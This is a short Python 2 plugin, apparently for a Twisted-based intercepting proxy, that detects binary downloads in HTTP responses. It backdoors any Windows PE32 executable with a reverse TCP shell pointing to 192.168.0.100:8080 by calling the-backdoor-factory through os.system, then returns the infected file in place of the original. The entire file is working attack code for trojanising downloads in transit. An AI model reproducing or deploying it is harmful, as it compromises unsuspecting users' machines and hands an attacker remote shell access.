from twisted.python import log
import tempfile, subprocess, os

class Plugin:
    def __init__(self):
        log.msg("Loading plugin - backdoor")
        self.applicationHeaders = ['application/octet-stream','application/x-msdos-program']

    def isFrakable(self, key, value):
        #is the header of type we want to frak with
        if key.lower() == 'content-type':
            for val in self.applicationHeaders:
                if value in val:
                    log.msg("Response is binary, INFECT! INFECT!...")
                    return True
        return False

    def frak(self, data):
	log.msg("backdooring!")
        #frak the data
	bfp = tempfile.NamedTemporaryFile()
        bfp.write(data)
        bfp.flush()
        p = subprocess.Popen(["file", bfp.name], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = p.communicate()
        if "PE32" in out:
            print "PE32 Detect"
            bfp.seek(0)
            #do some cli magic
            #./backdoor.py -f psexec.exe -H 192.168.0.100 -P 8080 -s reverse_shell_tcp -a
            print "../the-backdoor-factory/backdoor.py -q -f %s -H 192.168.0.100 -P 8080 -s reverse_shell_tcp -a" %  bfp.name
            print (os.path.join("../the-backdoor-factory/backdoored",os.path.basename(bfp.name)))
            os.system("~/Code/the-backdoor-factory/backdoor.py -q -f %s -H 192.168.0.100 -P 8080 -s reverse_shell_tcp -a" %  bfp.name)
            if os.path.isfile(os.path.join("backdoored",os.path.basename(bfp.name))):
                print "Skillz"
                fp_haxored = open(os.path.join("backdoored",os.path.basename(bfp.name)))
                data = fp_haxored.read()
                fp_haxored.close()
            else:
                 print "We not so leet"
            print "OWNAGE"
        bfp.close()
        return data

